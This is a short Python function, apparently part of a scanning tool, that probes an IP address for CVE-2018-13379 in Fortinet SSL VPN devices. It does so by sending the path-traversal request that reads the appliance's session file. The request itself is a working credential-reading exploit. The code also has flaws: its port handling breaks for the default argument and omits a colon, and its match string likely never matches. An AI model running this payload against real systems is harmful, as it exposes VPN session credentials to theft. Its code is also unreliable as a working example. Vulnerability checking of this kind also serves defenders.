import requests
from intrack.lib.headers.headers_handler import user_agents
from intrack.lib.color_handler import print_colour

def check_CVE_2018_13379(ip, ports=False, timeout=5):
	protocols = ["http", "https"]
	if ports is None:
		ports = [80]
	else:
		ports = [f":{port}" for port in ports]
	for protocol in protocols:
		for port in ports:
			url = f"{protocol}://{ip}{port}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
			headers = {
			    'User-Agent': user_agents()
			}
			try:
				response = requests.get(url, headers=headers, timeout=timeout, verify=False)
				if "^var fgt_lang =" in response.text:
					print_colour(f"The target is vulnerable to CVE-2018-13379 : {url}")
					return True
			except requests.RequestException:
				continue
	return False